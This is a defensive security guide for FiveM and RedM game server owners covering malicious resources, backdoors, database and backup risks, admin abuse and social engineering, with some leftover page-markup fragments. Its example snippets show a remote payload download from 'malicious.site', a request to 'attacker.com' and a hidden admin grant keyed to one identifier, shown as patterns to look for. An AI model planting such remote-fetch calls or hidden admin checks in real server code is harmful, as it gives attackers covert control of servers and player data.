## Introduction

Your FiveM or RedM server is a valuable asset. It hosts data, manages player interactions, and runs custom code. This also makes it a target. Bad actors range from script kiddies running automated exploits to sophisticated attackers with specific knowledge of your infrastructure. Understanding the threat landscape is the first step to defending it.

This guide covers the most common attack vectors, how they work, how to detect them, and how to prevent them. Consider it your server's security blueprint.

## Types of Malicious Actors

The people trying to compromise your server fall into several categories, each with different motivations and capabilities.

**Script Kiddies**

These are attackers with limited technical knowledge who use pre-built tools and scripts. They're the most common threat and typically run broad, indiscriminate attacks hoping something sticks. They lack the sophistication to target specific infrastructure but can still cause significant damage through sheer volume and persistence.

**Disgruntled Users**

Former admins, banned players, or unhappy staff members represent an insider threat. They have legitimate access credentials or knowledge of your infrastructure, which makes them particularly dangerous. They know your weak points because they've been inside your network.

**Competitors**

Other server owners may attempt to take down or compromise competing servers to drive players to their own. These attacks are often targeted and persistent.

**Professional Threat Actors**

Ransomware gangs and professional cybercriminals may target your server for financial gain. This tier operates at a higher level and may involve multiple attack vectors, reconnaissance, and patience.

**Nation State Actors**

Unlikely unless your server hosts something politically sensitive, but included for completeness. If you're worried about nation state actors, you have bigger problems than this guide can solve.

## Attack Vector: Malicious Resources and Scripts

The most common entry point for compromise is through custom resources and scripts. Your server runs code written by you, your developers, and potentially third-party developers. Any of these could be compromised or intentionally malicious.

### Direct Code Exploitation

A resource can perform almost any action on your server due to how FiveM's server-side scripting works. A malicious resource can:

Read sensitive data from your database and exfiltrate it to remote servers. This includes player information, financial data, or administrative logs. The attacker simply connects to your database with the same credentials your server uses and downloads whatever they want.

Modify server state to grant itself admin permissions, enable god mode, or create false evidence. Once administrative access is obtained, the attacker can do anything your admin system allows.

Execute arbitrary commands on the host machine running your server. With insufficient sandboxing, a compromised resource can break out of the FiveM runtime and access the underlying operating system.

Establish persistent access by creating backdoors that survive resource restarts or server reboots. The attacker doesn't need physical access to your machine to maintain control.

Create hidden functionality that operates silently. A resource might appear normal to administrators while performing malicious activities in the background. The code that handles player reports might also be logging their conversations to a remote server. The resource that manages transactions might be skimming a percentage to the attacker's account.

### Where Malicious Resources Come From

Developers and server owners obtain resources from various sources, not all of them trustworthy.

**Purchased or Downloaded Scripts**

Resources acquired from marketplaces, GitHub, or purchased from developers may contain hidden functionality. Developers might include backdoors intentionally to maintain control of the resource and extract value from it. A resource sold to multiple servers can have a single backdoor benefiting the original developer. They monitor their backdoored resource across all servers, collecting player data or running resource-intensive tasks.

Sometimes the resource is compromised after purchase. A developer's GitHub account is breached, and malicious code is added. The developer may not even realize their work has been compromised. Updates distributed to existing customers contain the malicious payload.

**Custom Development**

Even custom code written for your server can be compromised if the developer has malicious intent or their development environment has been compromised. A developer's laptop contains malware that injects code into resources before they're uploaded to your server. The developer has no idea this is happening because the injected code only activates under certain conditions they don't test for.

**Open Source Resources**

Open source doesn't mean secure. Many open source resources are abandoned or maintained by volunteers with limited security expertise. Vulnerabilities may exist and never be patched. Sometimes open source repositories are taken over by bad actors after the original maintainer loses interest. The repository's commit history is clean until suddenly it's not.

### Identifying Malicious Resources

Finding malicious code before it compromises your server requires vigilance and technical knowledge.

      title: "Code Review Everything",
      description:
        "Before deploying any resource, read the code. Yes, all of it. This is tedious but necessary. Look for suspicious patterns: connecting to external databases, downloading code from remote servers, creating hidden admin accounts, or accessing areas of the code that seem unrelated to the resource's stated purpose.",
      code: "-- Suspicious: Resource connects to external database\nMySQL.query('INSERT INTO attacker_database.players ...')\n\n-- Suspicious: Resource downloads and executes code\nDownloadString('http://malicious.site/payload.lua')\n\n-- Suspicious: Hidden admin grant\nif GetPlayerIdentifier(source) == 'license:deadbeef' then\n  grantAdmin(source)\nend",

      description:
        "If obtaining a resource from a developer or marketplace, verify it comes from the claimed source. Check GitHub commits, contact the developer directly, and verify PGP signatures if provided. A resource claiming to be from a well-known developer but hosted on an obscure link should raise red flags.",

        "Use network monitoring tools to see what your server is communicating with. Establish a baseline of normal traffic (CDN requests, API calls to expected services) then look for anomalies. A resource connecting to IP addresses in suspicious geographies or communicating on unusual ports deserves investigation.",
    },
    {
      title: "Check Resource Permissions and Capabilities",
      description:
        "FiveM allows resources to declare what capabilities they need. Review the fxmanifest.lua file and understand what permissions each resource requests. A player cosmetics resource shouldn't need database access. A whitelist manager shouldn't need to download external code.",
      code: "-- fxmanifest.lua\nfx_version 'cerulean'\ngame 'gta5'\n\nauthor 'Developer'\ndescription 'Example Resource'\nversion '1.0.0'\n\nserver_scripts {\n    'server/main.lua'\n}\n\ndependencies {\n    'mysql-async'\n}\n\nprovide_account_balance = true  -- What is this resource accessing?",

    },
  ]}
/>

## Attack Vector: Backdoors

A backdoor is a hidden entry point into your server that allows an attacker to maintain access and control. Unlike a one-time exploit, a backdoor persists even after you've supposedly removed the vulnerability that created it.

### Common Backdoor Mechanisms

<DefinitionList
  items={[
    {
      term: "Database Backdoors",
      description:
        "The attacker creates database accounts with non-obvious names (like 'backup_user' or 'maintenance_service') with strong passwords only they know. Even if you update your main database password, this account remains. They can access, modify, or exfiltrate data at will. Detection requires auditing all database accounts and their access logs.",
    },
    {
      term: "File System Backdoors",
      description:
        "The attacker places files in obscure locations that auto-execute when the server starts. A file named something innocuous in a resource's data folder that runs initialization code. A modified startup script that loads additional resources before the normal startup sequence. These survive resource updates because they exist outside the resource directories.",
    },
    {
      term: "Resource Backdoors",
      description:
        "A malicious resource is packaged with your legitimate resources. It might be named something that suggests it's part of the framework (like 'core-utilities' or 'framework-extension') making admins assume it's supposed to be there. The resource only activates under certain conditions (specific times, specific player IDs, or specific commands) so it doesn't trigger alarms during normal use.",
    },
    {
      term: "Admin Account Backdoors",
      description:
        "Hidden admin accounts are created with non-obvious identifiers. A Discord ID of an admin that seems high and random. A Steam ID that appears to be from nowhere. These accounts have full admin permissions but don't appear in normal admin listings because they're added through database manipulation rather than admin configuration files.",
    },
    {
      term: "Reverse Shell Backdoors",
      description:
        "The attacker establishes an outbound connection from your server to their machine, giving them remote command execution. This is particularly dangerous on Windows servers where the attacker could execute PowerShell commands or on Linux servers where they could execute bash. The connection often uses encrypted channels (SSH tunnels or encrypted HTTP) to avoid detection.",
    },
    {
      term: "Update Backdoors",
      description:
        "A malicious update to a resource is distributed. If your server auto-updates resources, the backdoor is installed automatically. Even if you don't auto-update, an admin downloading the latest version could install the compromised code without realizing it.",
    },
  ]}
/>

### Detecting Backdoors

Backdoor detection requires multiple approaches since no single method catches everything.

<CheckList
  items={[
    "Monitor unexpected network connections from your server to external IPs, especially on non-standard ports",
    "Audit all database accounts and their last login times. Unknown accounts are immediate red flags",
    "Review file modification timestamps in resource directories and outside them. Look for files modified outside your deployment process",
    "Check startup logs for resources you don't recognize or resources loading in unexpected order",
    "Monitor process creation on your host machine. Malicious resources might spawn child processes",
    "Review all admin accounts in your database and verify each one corresponds to a real administrator",
    "Check outbound connections using netstat or similar tools. Establish a baseline of normal traffic",
    "Enable and review database query logs. Look for queries from accounts you don't recognize",
    "Run file integrity checks. Tools like AIDE (Linux) or Windows File Integrity Monitoring can detect unauthorized changes",
  ]}
/>

### Removing Backdoors

Once you've identified a backdoor, thorough removal is critical because backdoors often have multiple layers.

<StepList
  steps={[
    {
      title: "Isolate the Server",
      description:
        "Take your server offline or restrict access while you investigate. Backdoors are often designed to alert the attacker when they're discovered. By going offline, you reduce the risk of the attacker noticing and establishing another backdoor. Restrict network access from the server to the internet if possible.",
    },
    {
      title: "Identify All Backdoor Components",
      description:
        "Don't just remove one suspicious resource or file. Backdoors are typically multi-layered. A single malicious resource might create database accounts, add hidden admin users, and place files in multiple locations. Finding one component should trigger a comprehensive search for others.",
      code: "-- Common backdoor patterns to search for:\n\n-- Hidden identifiers that grant permissions\n\nif identifier == 'hidden-admin-identifier' then\n\ngrantAdmin(source)\nend\n\n\n-- External communication\n\nHttpsRequest({url = 'http://attacker.com/...'})\n\n\n-- Resource restart immunity\n\nAddEventHandler('onServerResourceStart', function()\n\n  -- Persistence code\nend)",
    },
    {
      title: "Remove the Backdoor",
      description:
        "Delete malicious resources, drop compromised database accounts, delete unauthorized files, and remove hidden admin accounts. Don't just disable them. Completely remove them. A disabled account can be re-enabled.",
    },
    {
      title: "Change All Credentials",
      description:
        "Change database passwords, admin account passwords, credentials for external services, and any SSH keys if your infrastructure was compromised. Assume the attacker has copied any credentials they could access.",
    },
    {
      title: "Restore from Backup",
      description:
        "If you have a clean backup from before the compromise, restore your entire server from it. This is the most reliable way to ensure the backdoor is gone. However, you need to ensure your backup itself isn't compromised. Check backup dates and verify they're from before you believe the compromise occurred.",
      alert: {
        type: "warning",
        message:
          "Backup restoration is only effective if the backup was taken before the compromise. If the attacker had access for months but you only recently discovered it, all your recent backups might be compromised. Maintain long-term retention of older backups.",
      },
    },
    {
      title: "Audit Everything",
      description:
        "After removal, audit your entire infrastructure. Review code changes, commit histories, and deployment logs. Look for any other suspicious activity. A backdoor is rarely the only attack. The attacker typically begins with reconnaissance and may have established other access methods.",
    },
  ]}
/>

## Attack Vector: Database Compromise

Your database contains sensitive data: player information, financial records, configuration data, and sometimes personally identifiable information. Compromising it is a primary goal for attackers.

### Database Vulnerabilities

**Weak Database Credentials**

The most common vulnerability is simply using default or weak passwords. A database created with the default password left unchanged is trivial to compromise. Even slightly stronger passwords can be brute-forced if the database is accessible from the internet.

**Exposed Database Access**

Your database should never be directly accessible from the internet. It should only be accessible from your application server through a local or private connection. If an attacker can connect directly to your database from the internet, they don't need to compromise your FiveM server. They can access the database directly.

**SQL Injection**

Resources that construct SQL queries from user input without proper parameterization are vulnerable to SQL injection. A player's name field is used to build a query, and the player enters a name containing SQL code. The injected SQL executes with the database's full permissions, allowing the attacker to read, modify, or delete data.

**Unencrypted Connections**

Database connections should use encrypted channels (SSL/TLS). An unencrypted connection allows an attacker on the network path to see all database traffic, including credentials and sensitive queries.

**Credential Exposure**

Database credentials stored in resource code, configuration files, or commit history can be discovered. A GitHub repository containing a resource has database credentials in a config file. Even if the repository is private, it's vulnerable if the repository itself is compromised or if anyone with access turns malicious.

      permission: "required",
      description:
        "Apply security patches promptly. Unpatched databases are vulnerable to known exploits.",
    },
  ]}
/>

## Attack Vector: Compromised Backups and Restoration

Backups are critical for disaster recovery, but they're also a potential attack vector. A compromised backup can be used to restore a backdoored state or to access old credentials.

### Backup Vulnerabilities

**Unencrypted Backups**

Backups stored without encryption can be read by anyone with access to the backup storage. If your backup is on an AWS S3 bucket with public access, anyone can download your entire database.

**Overprivileged Backup Accounts**

The account used to create backups might have full database permissions. If this account is compromised, the attacker can access all data, not just what's in the backup.

**Backup Restoration without Verification**

Restoring from a backup without verifying its integrity or authenticity could restore a backdoored state. If an attacker can modify your backup, they can embed a backdoor that's restored when you think you're fixing an issue.

**Outdated Backups**

If you only keep recent backups and your server was compromised long ago, all your backups are likely compromised too. You have no clean state to restore to.

**Unencrypted Backup Transmission**

Backups in transit should be encrypted. Transferring backups over unencrypted channels allows interception and modification.

### Securing Backups

Treat backups with the same security standards as your live database, or perhaps even higher standards since they contain historical data and old credentials.

<StepList
  steps={[
    {
      title: "Encrypt Backups",
      description:
        "Encrypt backups at rest using strong encryption (AES-256 or better). Encrypt them in transit using TLS. The encryption key should be stored separately from the backups.",
    },
    {
      title: "Restrict Backup Access",
      description:
        "Limit who can create, modify, and restore backups. Use separate accounts for backup operations with minimal required permissions. Back up to isolated storage that's not directly accessible from your application server.",
    },
    {

      description:
        "Use cryptographic checksums or signatures to verify that backups haven't been modified. Create a checksum when the backup is made and verify it before restoration.",
      code: "-- Example: Creating a backup checksum\nsha256sum database_backup.sql > database_backup.sql.sha256\n\n-- Verifying before restoration\nsha256sum -c database_backup.sql.sha256",
    },
    {
      title: "Maintain Historical Backups",
      description:
        "Keep multiple versions of backups spanning a long timeframe. If your server was compromised months ago but you only recently discovered it, you need a backup from before the compromise occurred. Monthly or quarterly backups reaching back years are reasonable.",
    },
    {
      title: "Test Restoration Procedures",
      description:
        "Regularly test restoring from backups in a non-production environment. This ensures backups are functional and gives you experience with the restoration process before you desperately need it.",
    },
    {
      title: "Automate Backup Creation",
      description:
        "Use automated backup tools rather than manual backup creation. Automation is more reliable and less prone to mistakes. Schedule regular automated backups and verify they're completing successfully.",
    },
  ]}
/>

## Attack Vector: Admin Privilege Abuse

Admin privileges are powerful. They allow full control over the server. Abuse of these privileges, whether by a malicious actor with admin access or by an attacker who has compromised admin credentials, is devastating.

### Credential Compromise

Admin credentials can be compromised through phishing, malware on an admin's device, weak passwords, or password reuse. Once compromised, the attacker has legitimate admin access and can control the server while appearing to be a legitimate admin.

### Insider Threats

A disgruntled admin with legitimate access might abuse their privileges to damage the server, steal data, or extort the owner. They have legal access but use it maliciously.

### Privilege Escalation

A lower-privileged user might exploit vulnerabilities in your admin system to elevate their privileges. Flawed permission checks, logic errors, or SQL injection vulnerabilities could allow a player to grant themselves admin access.

### Defending Against Admin Abuse

<CheckList
  items={[
    "Implement multi-factor authentication (MFA) for admin accounts. This prevents compromise of a single password from granting access",
    "Limit admin accounts to only necessary users. The fewer admin accounts, the fewer targets for compromise",
    "Separate admin tiers with different permission levels. Senior admins have full control, moderators have limited control. Not everyone needs full power",
    "Audit admin actions. Log all admin commands and actions with timestamps and the admin who performed them. Suspicious patterns indicate potential abuse",
    "Require multiple admins to approve sensitive actions (like database resets or backup restorations). This prevents a single compromised account from causing maximum damage",

    "Monitor for unusual admin activity (commands at strange times, mass bans, excessive economic changes). Investigate anomalies",
    "Implement rate limiting on admin commands to prevent automated attacks. An attacker shouldn't be able to ban 1000 players in one second",
    "Use application-level admin systems rather than relying solely on database permissions. Your database permissions and your application permissions are independent layers",
  ]}
/>

## Attack Vector: Resource-Based Resource Exhaustion

A malicious or poorly written resource can consume excessive server resources (CPU, memory, disk, network), degrading server performance or causing crashes.

### Resource Exhaustion Attacks

A malicious resource could intentionally consume resources to degrade performance or cause denial of service. Infinite loops that consume CPU, allocating massive amounts of memory without freeing it, or continuously writing massive log files.

Poor resource management can have the same effect unintentionally. A resource that loads entire databases into memory, creates infinite loops due to logic errors, or generates excessive network traffic due to inefficient queries.

### Detecting and Preventing Resource Exhaustion

Monitor your server's resource usage and identify which resources are consuming the most resources. Use FiveM's performance monitoring tools to profile resource usage. Implement resource quotas that limit CPU, memory, or network usage per resource. Disable or restart resources that exceed quotas.

## Attack Vector: Social Engineering

Not all attacks are technical. Social engineering attacks target the humans running the server.

### Phishing

Attackers send fake emails or messages claiming to be from administrators, support teams, or other trusted sources. The message directs the recipient to enter credentials on a fake website. The attacker now has the credentials and can access the server.

### Impersonation

An attacker impersonates a legitimate developer or administrator. They offer to help with a problem or provide a new resource. The server owner, thinking they're getting help from someone trustworthy, grants access or executes code provided by the attacker.

### False Urgency

An attacker claims there's an immediate critical issue requiring urgent action. By inducing panic, they bypass the careful decision-making that would normally prevent the action.

### Defense Against Social Engineering

Verify requests independently before acting on them. If someone claims to be from support, contact support through official channels to verify. Educate your team about social engineering tactics. Require multiple approvals for sensitive actions so one deceived person can't cause damage alone.

## Detection and Response

Early detection of compromise reduces the damage. Quick response contains the attack.

## Conclusion

Bad actors targeting your server range from script kiddies to professionals. The attack vectors are numerous: malicious resources, backdoors, database compromise, credential theft, and social engineering. There is no single defense that prevents all attacks.

Security is layered. Implement multiple defenses so if one fails, others still protect you. Code review prevents many attacks. Credential security prevents others. Monitoring and logging enable detection. Incident response procedures minimize damage.

Stay informed about new threats and update your defenses accordingly. Your server is a constant target, but a well-hardened server with good practices is a poor target compared to negligently-managed alternatives. Attackers prefer easy wins.

Your vigilance matters. Review the practices in this guide, implement what you can, and maintain security as part of your regular server operations.
